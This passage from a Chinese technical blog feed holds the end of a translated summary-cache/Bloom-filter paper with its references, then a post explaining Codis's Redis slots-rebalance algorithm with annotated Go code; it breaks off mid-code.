尤其是，跟踪驱动的仿真表明，与ICP相比，新协议将代理间协议消息的数量减少了25到60，将带宽消耗减少了50％以上，同时几乎不降低代理质量。 缓存命中率。 仿真和分析进一步证明了该协议的可扩展性。</p><p>我们已经在<code>Squid 1.1.14</code>中构建了一个原型实现。 合成和跟踪重播实验表明，除了减少网络流量外，新协议还将CPU开销减少了75％至95％之间，并改善了客户端延迟。 原型实现是公开可用的[15]。</p><p>未来的工作还有很多。 我们计划调查该协议对父子代理合作以及给定工作负载的最佳层次结构配置的影响。 我们还计划研究摘要缓存在各种Web缓存一致性协议中的应用。 最后，摘要缓存可用于单个代理实现中以加快缓存查找的速度，我们将通过修改代理实现来量化效果。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p>[1] J. Almeida and P. Cao. (1997) Wisconsin proxy benchmark 1.0. [Online]. Available: <a href="http://www.cs.wisc.edu/~cao/wpbl.0.html">http://www.cs.wisc.edu/~cao/wpbl.0.html</a><br>[2] T.E. Anderson, M. D. Dahlin, J. M. Neefe, D. A. Patterson, D. S. Roselli,and R. Y. Wang,”Serverless network file systems,” in Proc. 15th ACM Syrup. Operating Syst. Principles,Dec. 1995.<br>[3] M. Arlitt, R. Friedrich, and T. Jin, “Performance evaluation of Web proxy cache replacement policies,” in Proc. Performance Tools’98, Lecture Notes in Computer Science, 1998, vol. 1469, pp. 193-206.<br>[4] M. Arlitt and C. Williamson, “Web server workload characterization,” in Proc. 1996 ACM SIGMETRICS Int. Conf. Measurement and Modeling of Computer Systems, May 1996.<br>[5] A. Baggio and G. Pierre. Oleron: Supporting information sharing in large-scale mobile environments, presented at ERSADS Workshop, Mar.[Online]. Available: <a href="http://www-sor.inria.fr/projects/relais/">http://www-sor.inria.fr/projects/relais/</a><br>[6] K. Beck. Tennessee cache box project, presented at 2nd Web Caching Workshop, Boulder, CO, June 1997. [Online]. Available: <a href="http://ircache.nlanr.net/Cache/Workshop97/">http://ircache.nlanr.net/Cache/Workshop97/</a><br>[7] B. Bloom, “Space&#x2F;time trade-offs in hash coding with allowable errors,” Commun. ACM, vol. 13, no. 7, pp. 422-426, July 1970.<br>[8] L. Breslau, P. Cao, L. Fan, G. Phillips, and S. Shenker, “Web caching and zipf-like distributions: Evidence and implications,” in Proc. IEEE INFOCOM, 1999.<br>[9] A. Z. Broder, “Some applications of Rabin’s fingerprinting method,” in Sequences 11: Methods in Communications, Security, and Computer Science, R. Capocelli, A. De Santis, and U. Vaccaro, Eds. New York, NY: Springer-Verlag, 1993, pp. 143-152.<br>[10] P. Can and S. Irani, “Cost-aware WWW proxy caching algorithms,” in Proc. 1997 USEN1X Symp. lnternet Technology and Systems, Dec. 1997, <a href="http://www.cs.wisc.edu/~cao/papers/gd-size.html">http://www.cs.wisc.edu/~cao/papers/gd-size.html</a>, pp. 193-206.<br>[11] M. Crovella and A. Bestavros, “Self-similiarity in world wide web traffic: Evidence and possible causes,” in Proc. 1996 Sigmetrics Conf. Measurement and Modeling of Computer Systems, Philadelphia, PA, May 1996.<br>[12] C. R. Cunha, A. Bestavros, and M. E. Crovella, “Characteristics of WWW client-based traces,” Boston University, Boston, MA, Tech. Rep. BU-CS-96-010, Oct. 1995.<br>[13] M. D. Dahlin, R. Y. Wang, T. E. Anderson, and D. A. Patterson, “Cooperative caching: Using remote client memory to improve file system performance,” in Proc. 1st USENIX Symp. Operating Systems Design and Implementation, Nov. 1994, pp. 267-280.<br>[14] P. B. Danzig, R. S. Hall, and M. E Schwartz, “A case for caching file objects inside internetworks,” in Proc. S1GCOMM, 1993, pp. 239-248.<br>[15] E Douglis, A. Feldmann, B. Krishnamurthy, and J. Mogul, “Rate of change and other metrics: A live study of the world wide web,” in Proc. USENIX Symp. lnternet Technology and Systems, Dec. 1997.<br>[16] B.M. Duska, D. Marwood, and M. J. Feeley, “The measured access characteristics of world-wide-web client proxy caches,” in Proc. USENIX Symp. lnternet Technology and Systems, Dec. 1997.<br>[17] L. Fan, P. Cao, and J. Almeida. (1998, Feb.) A prototype implementation of summary-cache enhanced icp in Squid 1.1.14. [Online]. Available: <a href="http://www.cs.wisc.edu/~cao/sc-icp.html">http://www.cs.wisc.edu/~cao/sc-icp.html</a><br>[18] L. Fan, P. Cao, J. Almeida, and A. Z. Broder, “Summary cache: A scalable wide-area web cache sharing protocol,” in Proc. ACM SIGCOMM,<br>[19] –, (1998, Feb.) Summary cache: A scalable wide-area web cache sharing protocol. Tech. Rep. 1361, Computer Science Department, University of Wisconsin-Madison. [Online]. Available: <a href="http://www.cs.wisc.edu/-cao/papers/summarycache.html">http://www.cs.wisc.edu/-cao/papers/summarycache.html</a><br>[20] M.J. Feeley, W. E. Morgan, E H. Pighin, A. R. Karlin, H. M. Levy, and C. A. Thekkath, “Implementing global memory management in a workstation cluster,” in Proc. 15th ACM Symp. Operating Systems Principles, Dec. 1995.<br>[21] ICP working group. (1998). National Lab for Applied Network Research. [Online]. Available: <a href="http://ircache.nlanr.neticache/ICP/">http://ircache.nlanr.netICache/ICP/</a><br>[22] A. Fox, S. D. Gribhle, Y. Chawathe, E. A. Brewer, and P. Gauthier<br>[23] S. Gadde, M. Rabinovich, and J. Chase. Reduce, reuse, recycle: An approach to building large internet caches, presented at 6th Workshop Hot Topics in Operating Systems (HotOS VI), May 1997. [Online]. Available: <a href="http://www.research.att.com/-misha/">http://www.research.att.com/-misha/</a><br>[24] G. Gonnet and R. Baeza-Yates, Handbook of Algorithms and Data Structures. Reading, MA: Addison-Wesley, 1991.<br>[25] S. Gribble and E. Brewer, “System design issues for intemet middleware service: Deduction from a large client trace,” in Proc. USENIX Symp.Internet Technology and Systems, Dec. 1997.<br>[26] –, (1997, June) UCB home IP HTTP traces. [Online]. Available:<a href="http://www.cs.berkeley.edu/~gribble/traces/index.html">http://www.cs.berkeley.edu/~gribble/traces/index.html</a><br>[27] C. Grimm. The dfn cache service in B-WiN. presented at 2nd Web Caching Workshop, Boulder, CO, June 1997. [Online]. Available: <a href="http://www-cache.dfn.de/CacheEN/">http://www-cache.dfn.de/CacheEN/</a><br>[28] The Harvest Group. (1994) Harvest Information Discovery and Access System. [Online]. Available: <a href="http://excalibur.usc.edu/">http://excalibur.usc.edu/</a><br>[29] The Relais Group. (1998) Relais: Cooperative caches for the world-wide web. [Online]. Available: <a href="http://www-sor.inria.fr/projects/relais/">http://www-sor.inria.fr/projects/relais/</a><br>[30] J. Gwertzman and M. Seltzer, “World-wide web cache consistency,” in Proc. 1996 USENIX Tech. Conf., San Diego, CA, Jan. 1996.<br>[31] IRCACHE. (1999, Mar.) Benchmarking Proxy Caches with Web Polygraph. [Online].Available: <a href="http://www.polygraph.ircache.net/slides/">http://www.polygraph.ircache.net/slides/</a><br>[32] V. Jacobson. How to kill the internet, presented at SIGCOMM’95 Middleware Workshop, Aug. 1995. [Online]. Available: <a href="ftp://ftp.ee.lhl/">ftp://ftp.ee.lhl</a> .gov&#x2F;talks&#x2F;vj -webflame.ps.Z<br>[33] J. Jung. Nation-wide caching project in korea, presented at 2nd Web Caching Workshop, Boulder, CO, June 1997. [Online]. Available: <a href="http://ircache.nlanr.net/Cache/Workshop97/">http://ircache.nlanr.net/Cache/Workshop97/</a><br>[34] B. Krishnamurthy and C. E. Ellis, “Study of piggyback cache validation for proxy caches in the world wide web,” in Proc. USENIX Symp. lnternet Technology and Systems, Dec. 1997.<br>[35] T. M. Kroeger, J. Mogul, and C. Maltzahn. (1996, Aug.) Digital’s web proxy traces. [Online]. Available: <a href="ftp://ftp.digital.com/pub/DEC/traces/proxy/webtraces.html">ftp://ftp.digital.com/pub/DEC/traces/proxy/webtraces.html</a><br>[36] T.M. Kroeger, D. D. E. Long, and J. C. Mogul, “Exploring the bounds of web latency reduction from caching and prefetching,” in Proc. USEN1X Syrup. lnternet Technology and Systems, Dec. 1997.<br>[37] C. Liu and P. Cao, “Maintaining strong cache consistency for the world-wide web,” presented at the 17th Int. Conf. Distributed Computing Systems, May 1997.<br>[38] P. Lorenzetti, L. Rizzo, and L. Vicisano. (1996, Oct.) Replacement policies for a proxy cache. Universita di Pisa, Italy. [Online]. Available: <a href="http://www.iet.unipi.it/~luigi/caching.ps.gz">http://www.iet.unipi.it/~luigi/caching.ps.gz</a><br>[39] C. Maltzahn, K. Richardson, and D. Grunwald, “Performance issues of enterprise level web proxies,” in Proc. 1997 ACM SIGMETRICS Int. Conf. Measurement and MOdeling of Computer Systems, June 1997, pp. 13-23.<br>[40] J. Marais and K. Bharat. Supporting cooperative and personal surfing with a desktop assistant, presented at ACM UIST’97. [Online]. Available: <a href="ftp://ftp.digital.com/pub/DEC/SRC/publications/marais/uist97paper.pdf">ftp://ftp.digital.com/pub/DEC/SRC/publications/marais/uist97paper.pdf</a>.<br>[41] A. J. Menezes, P. C. van Oorschot, and S. A. Vanstone, Handbook of Applied Cryptography: CRC Press, 1997.<br>[42] J. C. Mogul, E Douglis, A. Feldmann, and B. Krishnamurthy. Potential benefits of delta encoding and data compression for http.presented at ACM SIGCOMM’97. [Online]. Available: <a href="http://www.research.att.com/~douglis/">http://www.research.att.com/~douglis/</a><br>[43] National Lab of Applied Network Research. (1997, July) Sanitized Access Log.[Online].Available: <a href="ftp://ircache.nlanr.netltraces/">ftp://ircache.nlanr.netlTraces/</a><br>[44] J. Pietsch. Caching in the Washington State k-20 network, presented at2nd Web Caching Workshop, Boulder, CO, June 1997. [Online]. Available: http:&#x2F;lircache.nlanr.net&#x2F;CachelWorkshop97&#x2F;<br>[45] M. O. Rabin, “Fingerprinting by random polynomials,” Center for Research in Computing Technology, Harvard Univ., Tech. Rep. TR-15-81,1981.<br>[46] A. Rousskov. (1998, Apr.) Cache digest. [Online]. Available: <a href="http://squid.nlanr.net/Squid/CacheDigest/">http://squid.nlanr.net/Squid/CacheDigest/</a><br>[47] P. Sarkar and J. Hartman, “Efficient cooperative caching using hints,”in Proc. USENIX Conf. Operating System Design and Implementations,Oct. 1996.<br>[48] V. Valloppillil and K. W. Ross. (1997) Cache array routing protocol vl.0. [Online]. Available: http:l&#x2F;ircache.nlanr.net&#x2F;CachelICP&#x2F;draftvinod-carp-v 1-02.tx<br>[49] D. Wessels and K. Claffy. (1998) Internet cache protocol (ICP) v.2. [Online]. Available: <a href="http://ds.internic.net/rfc/rfc2186.txt">http://ds.internic.net/rfc/rfc2186.txt</a><br>[50] S. Williams, M. Abrams, C. R. Stanbridge, G. Abdulla, and E. A. Fox. Removal policies in network caches for world-wide web documents, presented at ACM SIGCOMM’96. [Online]. Available: <a href="http://ei.cs.vt.edu/~succeed/96sigcomm/">http://ei.cs.vt.edu/~succeed/96sigcomm/</a><br>[51] L. Zhang, S. Floyd, and V. Jacobson. Adaptive web caching, presented at<br>2nd Web Caching Workshop, Boulder, CO, June 1997. [Online]. Available: <a href="http://ircache.nlanr.net/Cache/Workshop97/Papers/Floyd/floyd">http://ircache.nlanr.net/Cache/Workshop97/Papers/Floyd/floyd</a></p>]]></content>
      
      
      <categories>
          
          <category> 论文 </category>
          
          <category> 杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> 论文 </tag>
            
            <tag> 布隆过滤器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Codis的Slots-Rebalance算法</title>
      <link href="/2020/05/21/codis-slots-rebalance/"/>
      <url>/2020/05/21/codis-slots-rebalance/</url>
      
        <content type="html"><![CDATA[<p>Codis 实现了另一种的 Redis 集群方案。在该方案中为了能够实现类似于 RedisCluster 的横向扩缩容的能力，Codis 内部实现了一种 Slot-Rebalance 的算法，该算法中所有的 key 都被哈希到 1024 个 slots 上，在每个 slots 分配均匀的前提下，如果一个分片中的 slots 过多，该分片中存储的 key 的数量也就越多，该分片对应的负载也就越大，在扩缩容之后为了保证集群中各分片的负载均衡，需要调整分片的 slots 的数量。</p><h2 id="一、简述"><a href="#一、简述" class="headerlink" title="一、简述"></a>一、简述</h2><h3 id="1-1、使用场景"><a href="#1-1、使用场景" class="headerlink" title="1.1、使用场景"></a>1.1、使用场景</h3><p><code>Codis</code>的集群初始为<code>2个分片</code>，当业务增长需要扩容到<code>4个分片</code>的时候，我们可以手动指定slots指挥<code>Codis</code>进行数据迁移，也可以使用<code>AutoRebalance</code>让<code>Codis</code>自动的进行Slots数据迁移。</p><h3 id="1-2、迁移原则"><a href="#1-2、迁移原则" class="headerlink" title="1.2、迁移原则"></a>1.2、迁移原则</h3><ul><li><p>尽可能的均匀分配Slots；</p></li><li><p>尽量减少迁移的Slots的数量；</p></li></ul><h2 id="二、Rebalance算法"><a href="#二、Rebalance算法" class="headerlink" title="二、Rebalance算法"></a>二、Rebalance算法</h2><h3 id="2-1、Slots分配方案"><a href="#2-1、Slots分配方案" class="headerlink" title="2.1、Slots分配方案"></a>2.1、Slots分配方案</h3><ul><li><p>统计当前迁移中<code>Slots</code>的结果，用于当前迁移方案的基础数据；</p></li><li><p>按照每个<code>Group</code>可分配Slots的最大限制，统计Group中需要迁入&#x2F;出的<code>Slots</code>信息；</p></li><li><p>依据现有的<code>Group</code>中<code>Slots</code>的数量构建红黑树，统计分配<code>Slots</code>；</p></li><li><p>审核并存储迁移方案；</p></li></ul><h3 id="2-2、代码实现"><a href="#2-2、代码实现" class="headerlink" title="2.2、代码实现"></a>2.2、代码实现</h3><figure class="highlight go"><table><tr><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s *Topom)</span></span> SlotsRebalance(confirm <span class="hljs-type">bool</span>) (<span class="hljs-keyword">map</span>[<span class="hljs-type">int</span>]<span class="hljs-type">int</span>, <span class="hljs-type">error</span>) &#123;<br>    s.mu.Lock()<br>    <span class="hljs-keyword">defer</span> s.mu.Unlock()<br>    ctx, err := s.newContext()<br>    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>    &#125;<br><br>    <span class="hljs-comment">/* 获取所有group的id,每一个group必须拥有redis实例，</span><br><span class="hljs-comment">     * 依据id从小到大排序group，其中group的id最小值为1</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">var</span> groupIds []<span class="hljs-type">int</span><br>    <span class="hljs-keyword">for</span> _, g := <span class="hljs-keyword">range</span> ctx.group &#123;<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(g.Servers) != <span class="hljs-number">0</span> &#123;<br>            groupIds = <span class="hljs-built_in">append</span>(groupIds, g.Id)<br>        &#125;<br>    &#125;<br>    sort.Ints(groupIds)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(groupIds) == <span class="hljs-number">0</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, errors.Errorf(<span class="hljs-string">&quot;no valid group could be found&quot;</span>)<br>    &#125;<br><br>    <span class="hljs-comment">/* 每一个分片(组)都拥有3个属性:</span><br><span class="hljs-comment">     *     assigned: 需要给当前的group分配的slots的数量</span><br><span class="hljs-comment">     *     pendings: 当前group需要移出的slots信息，其中key为group的id，value为slots的数组</span><br><span class="hljs-comment">     *     moveout:  当前group需要移出/入(为负数时代表移入)的slots数量，其中key为group的id，value为slots的数量</span><br><span class="hljs-comment">     * docking为需要最终操作的slots的列表</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">var</span> (<br>        assigned = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">int</span>]<span class="hljs-type">int</span>)<br>        pendings = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">int</span>][]<span class="hljs-type">int</span>)<br>        moveout  = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">int</span>]<span class="hljs-type">int</span>)<br>        docking  []<span class="hljs-type">int</span><br>    )<br><br>    <span class="hljs-comment">/* 获取group的当前的slots的数量 */</span><br>    <span class="hljs-keyword">var</span> groupSize = <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(gid <span class="hljs-type">int</span>)</span></span> <span class="hljs-type">int</span> &#123;<br>        <span class="hljs-keyword">return</span> assigned[gid] + <span class="hljs-built_in">len</span>(pendings[gid]) - moveout[gid]<br>    &#125;<br><br>    <span class="hljs-comment">/* 遍历slots，获取正在迁移中的slots的迁移结果并该结果计入本次的迁移统计 */</span><br>    <span class="hljs-keyword">for</span> _, m := <span class="hljs-keyword">range</span> ctx.slots &#123;<br>        <span class="hljs-keyword">if</span> m.Action.State != models.ActionNothing &#123;<br>            assigned[m.Action.TargetId]++<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* 按照平均值计算每个group可以分到的slots的数量(总量为1024) */</span><br>    <span class="hljs-keyword">var</span> lowerBound = MaxSlotNum / <span class="hljs-built_in">len</span>(groupIds)<br><br>    <span class="hljs-comment">/* 遍历slots，统计需要迁移的slots信息 */</span><br>    <span class="hljs-keyword">for</span> _, m := <span class="hljs-keyword">range</span> ctx.slots &#123;<br>        <span class="hljs-comment">/* 对于处于迁移状态中的slots不执行任何操作 */</span><br>        <span class="hljs-keyword">if</span> m.Action.State != models.ActionNothing &#123;<br>            <span class="hljs-keyword">continue</span><br>        &#125;<br>        <span class="hljs-comment">/* 当前的slots属于集群中的一个group */</span><br>        <span class="hljs-keyword">if</span> m.GroupId != <span class="hljs-number">0</span> &#123;<br>            <span class="hljs-comment">/* slot所归属group中的slots的数量小于group的平均值，则需要往这个group中分配新的slot */</span><br>            <span class="hljs-keyword">if</span> groupSize(m.GroupId) &lt; lowerBound &#123;<br>                assigned[m.GroupId]++<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-comment">/* slot所归属group中的slots的数量大于group的平均值，则需要将这个slot移出它所归属的group */</span><br>                pendings[m.GroupId] = <span class="hljs-built_in">append</span>(pendings[m.GroupId], m.Id)<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* 创建一个自定义比较器的红黑树，这棵树代表着需要进行slots迁移的所有group</span><br><span class="hljs-comment">     * key是group的id，slots最少的在左面，slots最多的在右面，key是group的id</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">var</span> tree = rbtree.NewWith(<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(x, y <span class="hljs-keyword">interface</span>&#123;&#125;)</span></span> <span class="hljs-type">int</span> &#123;<br>        <span class="hljs-keyword">var</span> gid1 = x.(<span class="hljs-type">int</span>)<br>        <span class="hljs-keyword">var</span> gid2 = y.(<span class="hljs-type">int</span>)<br>        <span class="hljs-keyword">if</span> gid1 != gid2 &#123;<br>            <span class="hljs-keyword">if</span> d := groupSize(gid1) - groupSize(gid2); d != <span class="hljs-number">0</span> &#123;<br>                <span class="hljs-keyword">return</span> d<br>            &#125;<br>            <span class="hljs-keyword">return</span> gid1 - gid2<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>    &#125;)<br>    <span class="hljs-keyword">for</span> _, gid := <span class="hljs-keyword">range</span> groupIds &#123;<br>        tree.Put(gid, <span class="hljs-literal">nil</span>)<br>    &#125;<br><br>    <span class="hljs-comment">/* 遍历所有的slots */</span><br>    <span class="hljs-keyword">for</span> _, m := <span class="hljs-keyword">range</span> ctx.slots &#123;<br>        <span class="hljs-comment">/* 对于处于迁移状态中的slots不执行任何操作 */</span><br>        <span class="hljs-keyword">if</span> m.Action.State != models.ActionNothing &#123;<br>            <span class="hljs-keyword">continue</span><br>        &#125;<br>        <span class="hljs-keyword">if</span> m.GroupId != <span class="hljs-number">0</span> &#123;<br>            <span class="hljs-keyword">continue</span><br>        &#125;<br><br>        <span class="hljs-comment">/* 有一些slots不属于任何group，需要将这些slots分配给slots最少的group，也就是红黑树左面的最小的group */</span><br>        dest := tree.Left().Key.(<span class="hljs-type">int</span>)<br>        tree.Remove(dest)<br><br>        docking = <span class="hljs-built_in">append</span>(docking, m.Id)<br>        moveout[dest]--<br><br>        tree.Put(dest, <span class="hljs-literal">nil</span>)<br>    &#125;<br><br>    <span class="hljs-comment">/* 每一个group能够获取slots的数量的上限，其实约等于 lowerBound + 1 */</span><br>    <span class="hljs-keyword">var</span> upperBound = (MaxSlotNum + <span class="hljs-built_in">len</span>(groupIds) - <span class="hljs-number">1</span>) / <span class="hljs-built_in">len</span>(groupIds)<br><br>    <span class="hljs-comment">/* 树中需要迁移的group大于等于2则需要进行rebalance，只有一个group就不需要了 */</span><br>    <span class="hljs-keyword">for</span> tree.Size() &gt;= <span class="hljs-number">2</span> &#123;<br>        from := tree.Right().Key.(<span class="hljs-type">int</span>)<br>        tree.Remove(from)<br><br>        <span class="hljs-comment">/* 当前group已经把所有需要移出的slots迁移出完毕 */</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(pendings[from]) == moveout[from] &#123;<br>            <span class="hljs-keyword">continue</span><br>        &#125;<br>        dest := tree.Left().Key.(<span class="hljs-type">int</span>)<br>        tree.Remove(dest)<br><br>        <span class="hljs-keyword">var</span> (<br>            fromSize = groupSize(from)<br>            destSize = groupSize(dest)<br>        )<br>        <span class="hljs-comment">/* 右面的group中slots的数量小于等于每个group的平均值,则表示该group迁移完成，不需要再次加入tree中 */</span><br>        <span class="hljs-keyword">if</span> fromSize &lt;= lowerBound &#123;<br>            <span class="hljs-keyword">break</span><br>        &#125;<br>        <span class="hljs-comment">/* 左面的group中slots的数量大于等于每个group的最大值,则表示该group也迁移完成，不需要再次加入tree中 */</span><br>        <span class="hljs-keyword">if</span> destSize &gt;= upperBound &#123;<br>            <span class="hljs-keyword">break</span><br>        &#125;<br>        <span class="hljs-comment">/* 左右group中的slots的数量相差小于等于1，则表示这个两个group也不需要再次加入tree中了 */</span><br>        <span class="hljs-keyword">if</span> d := fromSize - destSize; d &lt;= <span class="hljs-number">1</span> &#123;<br>            <span class="hljs-keyword">break</span><br>        &#125;<br><br>        <span class="hljs-comment">/* 右面的group移出了一个，左面的group加入了一个 */</span><br>        moveout[from]++<br>        moveout[dest]--<br><br>        <span class="hljs-comment">/* 还需要继续迁移，将这两个group继续加入树中 */</span><br>        tree.Put(from, <span class="hljs-literal">nil</span>)<br>        tree.Put(dest, <span class="hljs-literal">nil</span>)<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> gid, n := <span class="hljs-keyword">range</span> moveout &#123;<br>        <span class="hljs-keyword">if</span> n &lt; <span class="hljs-number">0</span> &#123;<br>            <span class="hljs-keyword">continue</span><br>        &#125;<br><br>        <span class="hljs-comment">/* 当前group需要移出n个slots */</span><br>        <span class="hljs-keyword">if</span> n &gt; <span class="hljs-number">0</span> &#123;<br>            <span class="hljs-comment">/* 倒序遍历需要移出的slots的列表，将需要迁移的slots加入到docking中 */</span><br>            sids := pendings[gid]<br>            sort.Sort(sort.Reverse(sort.IntSlice(sids)))<br><br>            docking = <span class="hljs-built_in">append</span>(docking, sids[<span class="hljs-number">0</span>:n]...)<br>            pendings[gid] = sids[n:]<br>        &#125;<br>        <span class="hljs-built_in">delete</span>(moveout, gid)<br>    &#125;<br>    <span class="hljs-comment">/* 排序需要操作的slots列表 */</span><br>    sort.Ints(docking)<br><br>    <span class="hljs-keyword">var</span> plans = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">int</span>]<span class="hljs-type">int</span>)<br><br>    <span class="hljs-comment">/* 遍历group，获取每一个group需要迁入多少个slots并将docking中的slots分配给对应的group，</span><br><span class="hljs-comment">     * plans就是最终的分配方案，将某一个slot分配给某一个group</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">for</span> _, gid := <span class="hljs-keyword">range</span> groupIds &#123;<br>        <span class="hljs-keyword">var</span> in = -moveout[gid]<br>        <span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; in &amp;&amp; <span class="hljs-built_in">len</span>(docking) != <span class="hljs-number">0</span>; i++ &#123;<br>            plans[docking[<span class="hljs-number">0</span>]] = gid<br>            docking = docking[<span class="hljs-number">1</span>:]<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* 审批该方案 */</span><br>    <span class="hljs-keyword">if</span> !confirm &#123;<br>        <span class="hljs-keyword">return</span> plans, <span class="hljs-literal">nil</span><br>    &#125;<br><br>    <span class="hljs-comment">/* 存储slots与group的分配方案后续执行 */</span><br>    <span class="hljs-keyword">var</span> slotIds []<span class="hljs-type">int</span><br>    <span class="hljs-keyword">for</span> sid, _ := <span class="hljs-keyword">range</span> plans &#123;<br>        slotIds = <span class="hljs-built_in">append</span>(slotIds, sid)<br>    &#125;<br>    sort.Ints(slotIds)<br><br>    <span class="hljs-keyword">for</span> _, sid := <span class="hljs-keyword">range</span> slotIds &#123;<br>        m, err := ctx.getSlotMapping(sid)<br>        <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>        &#125;<br>        <span class="hljs-keyword">defer</span> s.dirtySlotsCache(m.Id)<br><br>        m.Action.State = models.ActionPending<br>        m.Action.Index = ctx.maxSlotActionIndex() + <span class="hljs-number">1</span><br>        m.Action.TargetId = plans[sid]<br>        <span class="hljs-keyword">if</span> err := s.storeUpdateSlotMapping(m); err != <span class="hljs-literal">nil</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> plans, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-3、本地测试代码"><a href="#2-3、本地测试代码" class="headerlink" title="2.3、本地测试代码"></a>2.3、本地测试代码</h3><figure class="highlight go"><table><tr><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br>    <span class="hljs-string">&quot;fmt&quot;</span><br>    <span class="hljs-string">&quot;sort&quot;</span><br><br>    rbtree <span class="hljs-string">&quot;github.com/emirpasic/gods/trees/redblacktree&quot;</span><br>)<br><br><span class="hljs-comment">// Slot slot</span><br><span class="hljs-keyword">type</span> Slot <span class="hljs-keyword">struct</span> &#123;<br>    ID      <span class="hljs-type">int</span><br>    GroupID <span class="hljs-type">int</span><br>&#125;<br><br><span class="hljs-comment">// MaxSlotNum max</span><br><span class="hljs-keyword">var</span> MaxSlotNum = <span class="hljs-number">64</span><br><br><span class="hljs-comment">// SlotsRebalance slots rebalance</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">SlotsRebalance</span><span class="hljs-params">(groupIds []<span class="hljs-type">int</span>, slots []Slot)</span></span> (<span class="hljs-keyword">map</span>[<span class="hljs-type">int</span>]<span class="hljs-type">int</span>, <span class="hljs-type">error</span>) &#123;<br>    <span class="hljs-comment">// 排序group</span><br>    sort.Ints(groupIds)<br><br>    <span class="hljs-keyword">var</span> (<br>        assigned = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">int</span>]<span class="hljs-type">int</span>)<br>        pendings = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">int</span>][]<span class="hljs-type">int</span>)<br>        moveout  = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">int</span>]<span class="hljs-type">int</span>)<br>        docking  []<span class="hljs-type">int</span><br>    )<br>    <span class="hljs-keyword">var</span> groupSize = <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(gid <span class="hljs-type">int</span>)</span></span> <span class="hljs-type">int</span> &#123;<br>        <span class="hljs-keyword">return</span> assigned[gid] + <span class="hljs-built_in">len</span>(pendings[gid]) - moveout[gid]<br>    &#125;<br>    <span class="hljs-keyword">var</span> lowerBound = MaxSlotNum / <span class="hljs-built_in">len</span>(groupIds)<br><br>    <span class="hljs-comment">// 按照每个Group可分配Slots的最大限制，统计Group中需要迁入/出的Slots信息</span><br>    <span class="hljs-keyword">for</span> _, m := <span class="hljs-keyword">range</span> slots &#123;<br>        <span class="hljs-keyword">if</span> m.GroupID != <span class="hljs-number">0</span> &#123;<br>            <span class="hljs-keyword">if</span> groupSize(m.GroupID) &lt; lowerBound &#123;<br>                assigned[m.GroupID]++<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                pendings[m.GroupID] = <span class="hljs-built_in">append</span>(pendings[m.GroupID], m.ID)<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// 依据现有的Group中Slots的数量构建红黑树</span><br>    <span class="hljs-keyword">var</span> tree = rbtree.NewWith(<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(x, y <span class="hljs-keyword">interface</span>&#123;&#125;)</span></span> <span class="hljs-type">int</span> &#123;<br>        <span class="hljs-keyword">var</span> gid1 = x.(<span class="hljs-type">int</span>)<br>        <span class="hljs-keyword">var</span> gid2 = y.(<span class="hljs-type">int</span>)<br>        <span class="hljs-keyword">if</span> gid1 != gid2 &#123;<br>            <span class="hljs-keyword">if</span> d := groupSize(gid1) - groupSize(gid2); d != <span class="hljs-number">0</span> &#123;<br>                <span class="hljs-keyword">return</span> d<br>            &#125;<br>            <span class="hljs-keyword">return</span> gid1 - gid2<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>    &#125;)<br>    <span class="hljs-keyword">for</span> _, gid := <span class="hljs-keyword">range</span> groupIds &#123;<br>        tree.Put(gid, <span class="hljs-literal">nil</span>)<br>    &#125;<br>    <span class="hljs-comment">// fmt.Println(&quot;rbtree is &quot;, tree.String())</span><br><br>    <span class="hljs-comment">// 统计无主的slots</span><br>    <span 